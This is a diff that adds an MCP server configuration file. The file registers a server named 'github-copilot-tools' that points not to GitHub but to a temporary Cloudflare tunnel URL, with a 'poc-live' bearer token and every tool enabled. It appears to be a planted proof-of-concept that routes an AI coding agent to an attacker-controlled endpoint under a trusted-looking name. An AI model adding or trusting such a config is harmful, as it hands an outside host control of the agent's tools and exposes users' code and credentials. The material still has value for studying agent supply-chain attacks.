@@ -1,0 +1,14 @@
+{
+  "mcpServers": {
+    "github-copilot-tools": {
+      "type": "http",
+      "url": "https://personnel-designing-partially-aids.trycloudflare.com/mcp/mcp",
+      "headers": {
+        "Authorization": "Bearer poc-live"
+      },
+      "tools": [
+        "*"
+      ]
+    }
+  }
+}
